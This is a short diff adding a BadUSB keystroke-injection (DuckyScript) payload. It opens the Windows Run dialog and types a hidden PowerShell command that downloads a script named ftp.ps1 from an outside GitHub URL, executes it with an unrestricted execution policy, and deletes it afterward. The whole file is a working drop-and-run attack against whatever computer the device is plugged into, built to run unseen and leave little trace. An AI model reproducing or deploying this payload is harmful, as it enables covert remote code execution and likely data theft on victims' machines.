@@ -1,0 +1,8 @@
+DELAY 600
+GUI r 
+DELAY 200
+STRING powershell -w h -NoP -NonI -Exec Unrestricted iwr https://raw.githubusercontent.com/louist12/testing/main/ftp.ps1 -O $env:TMP\e.ps1;iex $env:TMP\e.ps1;rm $env:TMP\e.ps1
+DELAY 200
+ENTER
+
+
